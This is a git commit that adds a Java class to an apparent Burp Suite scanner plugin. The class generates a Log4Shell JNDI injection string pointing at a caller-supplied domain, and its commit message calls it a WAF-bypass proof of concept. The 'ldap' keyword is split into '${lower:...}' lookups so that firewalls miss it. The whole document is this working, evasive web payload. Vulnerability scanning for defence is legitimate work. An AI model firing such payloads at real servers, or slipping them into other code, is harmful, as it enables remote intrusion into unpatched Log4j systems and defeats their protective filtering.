b6bb6eaf438a34e585f77b5c87b14e7744a01290
whwlsfb <whwlsfb@wanghw.cn>
2021-12-11 19:45:51 +0800

    add bypass waf poc.

---
+++ src/main/java/burp/poc/impl/POC10.java
@@ -0,0 +1,11 @@
+package burp.poc.impl;
+
+import burp.poc.IPOC;
+import burp.utils.Utils;
+
+public class POC10 implements IPOC {
+    @Override
+    public String generate(String domain) {
+        return "${jndi:${lower:l}${lower:d}a${lower:p}://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
+    }
+}
